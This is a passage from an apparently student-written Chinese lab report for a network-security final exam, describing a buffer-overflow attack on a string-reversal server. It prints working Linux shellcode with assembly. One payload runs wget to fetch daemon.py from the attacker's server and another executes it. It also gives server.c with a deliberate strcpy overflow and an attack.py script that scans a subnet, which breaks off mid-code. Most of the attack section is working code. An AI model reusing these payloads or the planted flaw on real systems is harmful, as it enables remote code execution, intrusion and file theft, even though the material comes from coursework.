<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200622023021090.png" alt="image-20200622023021090"></p>
<p>我们开启加密</p>
<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200622023250674.png" alt="image-20200622023250674"></p>
<p>如下，如果传输文件内容加密，则抓取到的包，data部分是密文，无法被破译。</p>
<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200622023111428.png" alt="image-20200622023111428"></p>
<h2 id="4-3-分析密钥管理和传输加密方案的安全性"><a href="#4-3-分析密钥管理和传输加密方案的安全性" class="headerlink" title="4.3 分析密钥管理和传输加密方案的安全性"></a>4.3 分析密钥管理和传输加密方案的安全性</h2><ul>
<li><p>首先daemon.py作为服务器（受害方）被shellcode启动</p>
</li>
<li><p>客户端（攻击方），启动client.py通过socket连接上该服务器，创建非对称加密RSA密钥，发送公钥和公钥Sha256摘要给服务器</p>
</li>
<li><p>服务器（受害方）接收到RSA的公钥和公钥摘要之后，对公钥进行摘要判断，公钥是否被改动。如没有，就产生用于 AES 对称加密的密钥，将其用RSA公钥加密后，将其密文和密文摘要发给客户端（攻击方）</p>
</li>
<li><p>客户端（攻击方）同上用对 AES密钥进行摘要，判断是否被改动。如没有，双方便可以用 AES密钥进行通信的加密了。</p>
</li>
</ul>
<p><strong>分析：</strong></p>
<p>方案：客户端创建并发送非对称加密RSA公钥给服务端，服务端创建对称加密AES密钥发送给客户端，之后两方通过AES进行通信。</p>
<ul>
<li>可以有效保障传输内容的保密性：方案采用了AES对称加密通信的内容，并且使用了非对称加密RSA来对AES密钥进行加密</li>
<li>防止传输密钥时的中间人攻击：在传输RSA的公钥、传输AES的密钥时，同时都会发送其对应的Sha256哈希摘要，通过摘要验证的方式防止传输密钥包时的中间人改动攻击。</li>
<li>时效性强，防止重放攻击：由于我们的daemon服务端是shellcode启动的，主要功能是为客户端（攻击方）搜索发送指定的文件（姓名.txt），所以很快就关闭了。在交换密钥完成之后，就发送文件完毕。这些操作都是在很短的时间内完成的（所以消息中没有加入时间戳），而每次daemon服务端的启动，客户端都需要与其重新创建密钥并且交换密钥，密钥的产生很随机。时效性很强，可以有效的方式重放攻击。</li>
</ul>
<h1 id="五、Shellcode介绍"><a href="#五、Shellcode介绍" class="headerlink" title="五、Shellcode介绍"></a>五、Shellcode介绍</h1><h2 id="5-1-创建-学号-txt"><a href="#5-1-创建-学号-txt" class="headerlink" title="5.1 创建 学号.txt"></a>5.1 创建 学号.txt</h2><p>主要是利用了linux中的系统调用int 80来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数,从 <code>/usr/include/asm/unistd.h</code>中可以看到。</p>
<p>在本shellcode中我们的操作如下</p>
<ul>
<li>首先5号调用open系统调用，创建文件<code>LinFengLv.txt</code></li>
<li>然后4号调用write系统调用，写文件内容<code>2017301500076</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd.h | less总共有383条</span><br><span class="line">#define __NR_exit                 1</span><br><span class="line">#define __NR_fork                 2</span><br><span class="line">#define __NR_read                 3</span><br><span class="line">#define __NR_write                4 &lt;------2 写文件内容&#96;2017301500076&#96;</span><br><span class="line">#define __NR_open                 5 &lt;------1 创建文件&#96;LinFengLv.txt&#96;</span><br><span class="line">#define __NR_close                6 </span><br><span class="line">#define __NR_waitpid              7</span><br><span class="line">#define __NR_creat                8</span><br><span class="line">#define __NR_link                 9</span><br><span class="line">#define __NR_unlink              10</span><br><span class="line">#define __NR_execve              11</span><br></pre></td></tr></table></figure>

<p>以32位linux为例（64位下系统调用号是不同的）：</p>
<p><strong>打开文件的调用号</strong>为5，将5存入eax，ebx存入文件路径字符串的首地址，ecx存入打开方式，只读为“0”，写为“03101”，edx存入权限集合，现在存入“0666”就行了，反正我不懂unix的权限。打开成功后，系统会返回该文件的“文件标识符”,在eax里面。之后全程都要用这个文件标识符指代打开的那个文件。</p>
<p>读取文件的调用号为3，存入eax，文件标识符存入ebx，在此之前，要划一个缓存区，用来储存读取的数据，将该缓存区的首地址存入ecx，长度存入edx。读取成功后，会按照edx中的长度填充缓存区，就是edx的值是多少，就填充多少（当然，由文件的长度而定），返回已经读取的长度。</p>
<p><strong>写入文件的调用号</strong>为4，存入eax，其余参数同上。返回写入的字节数或者错误代码（写入失败），存入eax。</p>
<p>关闭文件的调用号为6，存入eax，文件描述符存入ebx。只有这两个参数。</p>
<p><strong>字节码和汇编代码如下，注释了</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;################字节码#############</span><br><span class="line">;shellcode_createtxt&#x3D;b&#39;\x31\xc0\xb0\xa0\x29\xc4\x31\xd2\x31\xc9\x66\xba\xff\x01\x66\xb9\x41\x06\x31\xdb\x53\x68\x2e\x74\x78\x74\x68\x6e\x67\x4c\x76\x68\x69\x6e\x46\x65\x68\x2e\x2f\x2f\x4c\x89\xe3\x31\xc0\xb0\x05\xcd\x80\x31\xdb\x53\x6a\x36\x68\x30\x30\x30\x37\x68\x33\x30\x31\x35\x68\x32\x30\x31\x37\x89\xe1\x89\xc3\x31\xd2\xb2\x0d\x31\xc0\xb0\x04\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x31\xc0\xb0\x01\xcd\x80&#39;</span><br><span class="line">;################字节码#############</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;抬高栈顶指针esp避免影响代码&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">xor eax,eax;</span><br><span class="line">mov al,0xA0</span><br><span class="line">sub esp,eax</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;open系统调用，创建文件&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">;linux中openfile可以用于创建文件</span><br><span class="line"></span><br><span class="line">xor edx,edx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">mov dx, 777q  ;文件的权限集合存入edx</span><br><span class="line">mov cx, 3101q ;文件的打开方式存入ecx</span><br><span class="line">xor ebx,ebx</span><br><span class="line">push ebx</span><br><span class="line">push &quot;.txt&quot;</span><br><span class="line">push &quot;ngLv&quot;</span><br><span class="line">push &quot;inFe&quot;</span><br><span class="line">push &quot;.&#x2F;&#x2F;L&quot; ;文件名.&#x2F;&#x2F;LinFengLv.txt&#x3D;LinFengLv.txt</span><br><span class="line">mov ebx, esp ;文件名地址存入ebx</span><br><span class="line">xor eax,eax	</span><br><span class="line">mov al,05h ;open系统调用号</span><br><span class="line">int 80h</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;write系统调用，写文件&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">xor ebx,ebx</span><br><span class="line">push ebx</span><br><span class="line">push &quot;6&quot;</span><br><span class="line">push &quot;0007&quot;</span><br><span class="line">push &quot;3015&quot;</span><br><span class="line">push &quot;2017&quot; ;文件内容2017301500076</span><br><span class="line">mov ecx, esp ;文件内容地址存入ecx</span><br><span class="line"></span><br><span class="line">mov ebx,eax	 ;上一个系统调用获得的文件描述符</span><br><span class="line">xor edx,edx</span><br><span class="line">mov dl,0dh  ;edx中存入文件内容的长度</span><br><span class="line"></span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,04h  ;write系统调用号</span><br><span class="line">int 80h</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;close系统调用，关闭文件描述符&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;（可以不要）</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,06h</span><br><span class="line">int 80h</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;exit系统调用退出&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;（可以不要）</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,01h</span><br><span class="line">int 80h</span><br></pre></td></tr></table></figure>

<h2 id="5-2-下载-daemon程序"><a href="#5-2-下载-daemon程序" class="headerlink" title="5.2 下载 daemon程序"></a>5.2 下载 daemon程序</h2><p>主要是利用了linux中的系统调用int 80来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数,从 <code>/usr/include/asm/unistd.h</code>中可以看到。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd.h | less总共有383条</span><br><span class="line">#define __NR_execve              11 &lt;---本次调用</span><br></pre></td></tr></table></figure>

<p>在本shellcode中我们的操作：</p>
<p>调用execve系统调用来执行命令行（从攻击方开启的apache服务器中下载daemon.py)：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/wget 192.168.30.131/f/daemon.py</span><br></pre></td></tr></table></figure>

<p><strong>字节码和汇编代码如下，注释了</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;################字节码#############</span><br><span class="line">;shellcode_daemon&#x3D;b&#39;\x31\xc0\xb0\xa0\x29\xc4\x31\xc0\x50\x89\xc2\x68\x6e\x2e\x70\x79\x68\x61\x65\x6d\x6f\x68\x2f\x2f\x2f\x64\x68\x33\x31\x2f\x66\x68\x33\x30\x2e\x31\x68\x31\x36\x38\x2e\x68\x31\x39\x32\x2e\x89\xe1\x31\xc0\x50\x6a\x74\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xb0\x0b\xcd\x80&#39;</span><br><span class="line">;################字节码#############</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;抬高栈顶指针esp避免影响代码&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,0xA0</span><br><span class="line">sub esp,eax</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;调用execve系统调用来执行命令行&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">;作用（下载daemon.py）：&#x2F;usr&#x2F;bin&#x2F;wget 192.168.30.131&#x2F;f&#x2F;daemon.py</span><br><span class="line">xor eax,eax</span><br><span class="line">push eax</span><br><span class="line">mov edx,eax ;首先是edx为0</span><br><span class="line">push &quot;n.py&quot;</span><br><span class="line">push &quot;aemo&quot;</span><br><span class="line">push &quot;&#x2F;&#x2F;&#x2F;d&quot;</span><br><span class="line">push &quot;31&#x2F;f&quot;</span><br><span class="line">push &quot;30.1&quot;</span><br><span class="line">push &quot;168.&quot;</span><br><span class="line">push &quot;192.&quot;	</span><br><span class="line">mov ecx,esp ;ecx为字符串192.168.30.131&#x2F;f&#x2F;daemon.py的地址</span><br><span class="line"></span><br><span class="line">xor eax,eax</span><br><span class="line">push eax</span><br><span class="line">push 0x74 ;t</span><br><span class="line">push 0x6567772f ;egw&#x2F;</span><br><span class="line">push 0x6e69622f ;nib&#x2F;</span><br><span class="line">push 0x7273752f ;rsu&#x2F;</span><br><span class="line">mov ebx,esp ;ebx是执行程序&#x2F;usr&#x2F;bin&#x2F;wget的地址</span><br><span class="line"></span><br><span class="line">push edx</span><br><span class="line">push ecx</span><br><span class="line">push ebx</span><br><span class="line">mov ecx,esp ;ecx是ebx、ecx、edx三个execve参数的地址</span><br><span class="line">mov al,0bh ;eax是execve系统调用号0bh</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<h2 id="5-3-运行daemon程序"><a href="#5-3-运行daemon程序" class="headerlink" title="5.3 运行daemon程序"></a>5.3 运行daemon程序</h2><p>主要是利用了linux中的系统调用int 80来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数,从 <code>/usr/include/asm/unistd.h</code>中可以看到。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd.h | less总共有383条</span><br><span class="line">#define __NR_execve              11 &lt;---本次调用</span><br></pre></td></tr></table></figure>

<p>在本shellcode中我们的操作：</p>
<p>调用execve系统调用来执行命令行（执行daemon.py）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/python daemon.py</span><br></pre></td></tr></table></figure>

<p><strong>字节码和汇编代码如下，注释了</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;################字节码#############</span><br><span class="line">;shellcode_execdaemon&#x3D;b&#39;\x31\xc0\x50\x89\xc2\x68\x6e\x2e\x70\x79\x68\x61\x65\x6d\x6f\x68\x2e\x2f\x2f\x64\x89\xe1\x31\xc0\x50\x68\x74\x68\x6f\x6e\x68\x2f\x2f\x70\x79\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xb0\x0b\xcd\x80&#39;</span><br><span class="line">;################字节码#############</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;抬高栈顶指针esp避免影响代码&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,0xA0</span><br><span class="line">sub esp,eax</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;调用execve系统调用来执行命令行&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">;作用（运行daemon.py）：&#x2F;usr&#x2F;bin&#x2F;python daemon.py</span><br><span class="line">xor eax,eax</span><br><span class="line">push eax</span><br><span class="line">mov edx,eax ;首先是edx为0</span><br><span class="line">push &quot;n.py&quot;</span><br><span class="line">push &quot;aemo&quot;</span><br><span class="line">push &quot;.&#x2F;&#x2F;d&quot;	</span><br><span class="line">mov ecx,esp ;ecx为字符串daemon.py的地址</span><br><span class="line"></span><br><span class="line">xor eax,eax</span><br><span class="line">push eax</span><br><span class="line">push &quot;thon&quot;</span><br><span class="line">push &quot;&#x2F;&#x2F;py&quot;</span><br><span class="line">push &quot;&#x2F;bin&quot;</span><br><span class="line">push &quot;&#x2F;usr&quot;</span><br><span class="line">mov ebx,esp ;ebx是执行程序&#x2F;usr&#x2F;bin&#x2F;python的地址</span><br><span class="line"></span><br><span class="line">push edx</span><br><span class="line">push ecx</span><br><span class="line">push ebx</span><br><span class="line">mov ecx,esp ;ecx是ebx、ecx、edx三个execve参数的地址</span><br><span class="line">mov al,0bh ;eax是execve系统调用号0bh</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<h1 id="六、任务二、三总体代码"><a href="#六、任务二、三总体代码" class="headerlink" title="六、任务二、三总体代码"></a>六、任务二、三总体代码</h1><h2 id="6-1-字符串翻转服务端程序-server-c"><a href="#6-1-字符串翻转服务端程序-server-c" class="headerlink" title="6.1 字符串翻转服务端程序 server.c"></a>6.1 字符串翻转服务端程序 server.c</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;strings.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 8000</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> bufferA[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(bufferA,str); <span class="comment">//&lt;-----------漏洞所在</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//逆转字符串</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">	foo(str);</span><br><span class="line">	<span class="keyword">int</span> ilen = <span class="built_in">strlen</span>(str);</span><br><span class="line">	<span class="keyword">char</span>* p = str + ilen - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> itemp = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(str &lt; p)&#123;</span><br><span class="line">		itemp = *p;</span><br><span class="line">		*p = *str;</span><br><span class="line">		*str = itemp;</span><br><span class="line">		p--;</span><br><span class="line">		str++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sfd, cfd;</span><br><span class="line">    <span class="keyword">int</span> i, len;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>, <span class="title">client_addr</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4096</span>], client_ip[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">socklen_t</span> addr_len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//AF_INET:ipv4   SOCK_STREAM:流协议   0:默认协议(tcp,udp)</span></span><br><span class="line">    sfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//绑定前先构造出服务器地址</span></span><br><span class="line">    bzero(&amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line">    serv_addr.sin_family = AF_INET;</span><br><span class="line">    <span class="comment">//网络字节序</span></span><br><span class="line">    serv_addr.sin_port = htons(SERV_PORT);</span><br><span class="line">    <span class="comment">//INADDR_ANY主机所有ip</span></span><br><span class="line">    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line">    bind(sfd, (struct sockaddr *)&amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//服务器能接收并发链接的能力</span></span><br><span class="line">    <span class="built_in">listen</span>(sfd, <span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"wait for connect ...\n"</span>);</span><br><span class="line">    addr_len = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">    <span class="comment">//阻塞，等待客户端链接，成功则返回新的文件描述符，用于和客户端通信</span></span><br><span class="line">	<span class="comment">// 参数1是sfd; 参2传出参数, 参3传入传入参数, 全部是client端的参数</span></span><br><span class="line">    cfd = accept(sfd, (struct sockaddr *)&amp;client_addr, &amp;addr_len);</span><br><span class="line">	<span class="comment">// 打印链接的客户端地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"client IP:%s\t%d\n"</span>, </span><br><span class="line">            inet_ntop(AF_INET, &amp;client_addr.sin_addr.s_addr, client_ip,<span class="keyword">sizeof</span>(client_ip)),ntohs(client_addr.sin_port));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">//阻塞接收客户端数据</span></span><br><span class="line">        len = <span class="built_in">read</span>(cfd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">		<span class="comment">// 将客户端发送的数据输出到屏幕中</span></span><br><span class="line">        <span class="built_in">write</span>(STDOUT_FILENO, buf, len);</span><br><span class="line">		reverse(buf);</span><br><span class="line">		</span><br><span class="line">        <span class="comment">//返回给客户端结果</span></span><br><span class="line">        <span class="built_in">write</span>(cfd, buf, len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(cfd);</span><br><span class="line">    <span class="built_in">close</span>(sfd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-2-恶意客户端程序-attack-py"><a href="#6-2-恶意客户端程序-attack-py" class="headerlink" title="6.2 恶意客户端程序 attack.py"></a>6.2 恶意客户端程序 attack.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="comment"># 创建接收路由列表</span></span><br><span class="line"></span><br><span class="line">shellcode_createtxt=<span class="string">b'\x31\xc0\xb0\xa0\x29\xc4\x31\xd2\x31\xc9\x66\xba\xff\x01\x66\xb9\x41\x06\x31\xdb\x53\x68\x2e\x74\x78\x74\x68\x6e\x67\x4c\x76\x68\x69\x6e\x46\x65\x68\x2e\x2f\x2f\x4c\x89\xe3\x31\xc0\xb0\x05\xcd\x80\x31\xdb\x53\x6a\x36\x68\x30\x30\x30\x37\x68\x33\x30\x31\x35\x68\x32\x30\x31\x37\x89\xe1\x89\xc3\x31\xd2\xb2\x0d\x31\xc0\xb0\x04\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x31\xc0\xb0\x01\xcd\x80'</span></span><br><span class="line">shellcode_daemon=<span class="string">b'\x31\xc0\xb0\xa0\x29\xc4\x31\xc0\x50\x89\xc2\x68\x6e\x2e\x70\x79\x68\x61\x65\x6d\x6f\x68\x2f\x2f\x2f\x64\x68\x33\x31\x2f\x66\x68\x33\x30\x2e\x31\x68\x31\x36\x38\x2e\x68\x31\x39\x32\x2e\x89\xe1\x31\xc0\x50\x6a\x74\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xb0\x0b\xcd\x80'</span></span><br><span class="line">shellcode_execdaemon=<span class="string">b'\x31\xc0\x50\x89\xc2\x68\x6e\x2e\x70\x79\x68\x61\x65\x6d\x6f\x68\x2e\x2f\x2f\x64\x89\xe1\x31\xc0\x50\x68\x74\x68\x6f\x6e\x68\x2f\x2f\x70\x79\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xb0\x0b\xcd\x80'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建互斥锁</span></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"><span class="comment"># 设置需要扫描的端口号列表</span></span><br><span class="line">port_list = [<span class="string">"8000"</span>]</span><br><span class="line"><span class="comment"># routers = []</span></span><br><span class="line">routers = [[<span class="string">"192.168.30.133"</span>,<span class="string">"8000"</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment">#获得本机ip</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_host_ip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">        s.connect((<span class="string">'8.8.8.8'</span>, <span class="number">80</span>))</span><br><span class="line">        ip = s.getsockname()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">return</span> ip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义查询路由函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_routers</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 获取本地ip地址</span></span><br><span class="line">    ip=get_host_ip()</span><br><span class="line">    <span class="comment"># 存放线程列表池</span></span><br><span class="line">    all_threads = []</span><br><span class="line">    <span class="comment"># 循环本地网卡IP列表</span></span><br><span class="line">    print(str())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">        <span class="comment"># 把网卡IP"."进行分割,生成每一个可用地址的列表</span></span><br><span class="line">        array = ip.split(<span class="string">'.'</span>)</span><br><span class="line">        <span class="comment"># 获取分割后的第四位数字，生成该网段所有可用IP地址</span></span><br><span class="line">        array[<span class="number">3</span>] = str(i)</span><br><span class="line">        <span class="comment"># 把分割后的每一可用地址列表，用"."连接起来，生成新的ip</span></span><br><span class="line">        new_ip = <span class="string">'.'</span>.join(array)</span><br><span class="line">        <span class="comment">#print(new_ip)</span></span><br><span class="line">        <span class="comment"># 遍历需要扫描的端口号列表</span></span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> port_list:</span><br><span class="line">            dst_port = int(port)</span><br><span class="line">            <span class="comment"># 循环创建线程去链接该地址</span></span><br><span class="line">            t = threading.Thread(target=check_ip, args=(new_ip, dst_port))</span><br><span class="line">            t.start()</span><br><span class="line">            <span class="comment"># 把新建的线程放到线程池</span></span><br><span class="line">            all_threads.append(t)</span><br><span class="line">    <span class="comment"># 循环阻塞主线程，等待每一字子线程执行完，程序再退出</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> all_threads:</span><br><span class="line">        t.join()</span><br><span class="line">    print(routers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建访问IP列表方法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_ip</span><span class="params">(new_ip, port)</span>:</span></span><br><span class="line">    <span class="comment"># 创建TCP套接字，链接新的ip列表</span></span><br><span class="line">    scan_link = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment"># 设置链接超时时间</span></span><br><span class="line">    scan_link.settimeout(<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># 链接地址(通过指定我们 构造的主机地址，和扫描指定端口)</span></span><br><span class="line">    result = scan_link.connect_ex((new_ip, port))</span><br><span class="line">    <span class="comment"># input_data = b"\x90" * (120)</span></span><br><span class="line">    <span class="comment"># scan_link.send(input_data)  # 使服务器错误爆炸退出</span></span><br><span class="line">    scan_link.close()</span><br><span class="line">    <span class="comment"># print(result)</span></span><br><span class="line">    <span class="comment"># 判断链接结果</span></span><br><span class="line">    <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 加锁</span></span><br><span class="line">        lock.acquire()</span><br><span class="line">        print(new_ip, <span class="string">'\t\t端口号%s开放'</span> % port)</span><br><span class="line">        routers.append((new_ip, port))</span><br><span class="line">        <span class="comment"># 释放锁</span></span><br><span class="line">        lock.release()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comm_or_attack</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> route <span class="keyword">in</span> routers:</span><br><span class="line">        attack_a = input(<span class="string">"是否攻击/通信"</span>+route[<span class="number">0</span>]+route[<span class="number">1</span>]+<span class="string">"？(y/n):"</span>)</span><br><span class="line">        <span class="keyword">if</span> attack_a==<span class="string">"y"</span>: <span class="comment">#是否对该ip进行攻击/通信</span></span><br><span class="line">            <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                    <span class="keyword">if</span> (clientsocket.connect((route[<span class="number">0</span>], int(route[<span class="number">1</span>]))) != <span class="number">0</span>):</span><br><span class="line">                        tans(clientsocket)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    print(<span class="string">"此轮clientsocket出错"</span>)</span><br><span class="line">                <span class="comment"># shutdown(2) #收发通道关闭</span></span><br><span class="line">                clientsocket.close() <span class="comment">#关闭socket</span></span><br><span class="line">                attack_a3 = input(<span class="string">"此轮socket已关闭，是否继续攻击/通信（需要等目标恢复服务）？(y/n):"</span>)</span><br><span class="line">                <span class="keyword">if</span> attack_a3 == <span class="string">"y"</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    print(<span class="string">"END"</span>)</span><br><span class="line"></span><br><span 